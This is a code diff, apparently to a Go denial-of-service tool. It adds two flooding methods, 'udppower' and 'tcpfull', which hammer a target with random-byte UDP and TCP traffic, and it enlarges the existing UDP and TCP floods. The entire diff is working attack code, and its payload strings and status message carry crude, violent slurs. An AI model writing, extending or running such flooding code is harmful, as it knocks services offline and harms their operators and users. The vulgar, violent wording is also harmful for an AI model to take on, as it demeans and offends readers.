@@ -19,12 +19,15 @@ func Run(method, target string, threads, duration int) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-
 			switch method {
 			case "udp":
 				udpFlood(target)
+			case "udppower":
+				udpPower(target)
 			case "tcp", "flood":
 				tcpFlood(target)
+			case "tcpfull":
+				tcpFull(target)
 			case "syn":
 				synFlood(target)
 			}
@@ -32,7 +35,7 @@ func Run(method, target string, threads, duration int) {
 	}
 
 	time.AfterFunc(time.Duration(duration)*time.Second, func() {
-		fmt.Println("[+] L4 attack finished.")
+		fmt.Println("[+] L4 shit stopped.")
 		os.Exit(0)
 	})
 
@@ -43,8 +46,8 @@ func udpFlood(target string) {
 	for {
 		conn, err := net.Dial("udp", target)
 		if err == nil {
-			for i := 0; i < 40; i++ {
-				conn.Write([]byte("fucked" + string(make([]byte, 512))))
+			for i := 0; i < 60; i++ {
+				conn.Write([]byte("fucked" + string(make([]byte, 1024))))
 			}
 			conn.Close()
 		}
@@ -52,16 +55,50 @@ func udpFlood(target string) {
 	}
 }
 
+func udpPower(target string) {
+	for {
+		conn, err := net.Dial("udp", target)
+		if err == nil {
+			data := make([]byte, 8192)
+			for i := range data {
+				data[i] = byte(rand.Intn(255))
+			}
+			for i := 0; i < 150; i++ {
+				conn.Write(data)
+			}
+			conn.Close()
+		}
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
 func tcpFlood(target string) {
 	for {
 		conn, err := net.DialTimeout("tcp", target, 3*time.Second)
 		if err == nil {
-			for i := 0; i < 25; i++ {
+			for i := 0; i < 40; i++ {
 				conn.Write([]byte("GET / HTTP/1.1\r\nHost: raped\r\n\r\n"))
 			}
 			conn.Close()
 		}
 		time.Sleep(3 * time.Millisecond)
+	}
+}
+
+func tcpFull(target string) {
+	for {
+		conn, err := net.DialTimeout("tcp", target, 2*time.Second)
+		if err == nil {
+			junk := make([]byte, 4096)
+			for i := range junk {
+				junk[i] = byte(rand.Intn(255))
+			}
+			for i := 0; i < 80; i++ {
+				conn.Write(junk)
+			}
+			conn.Close()
+		}
+		time.Sleep(1 * time.Millisecond)
 	}
 }
 
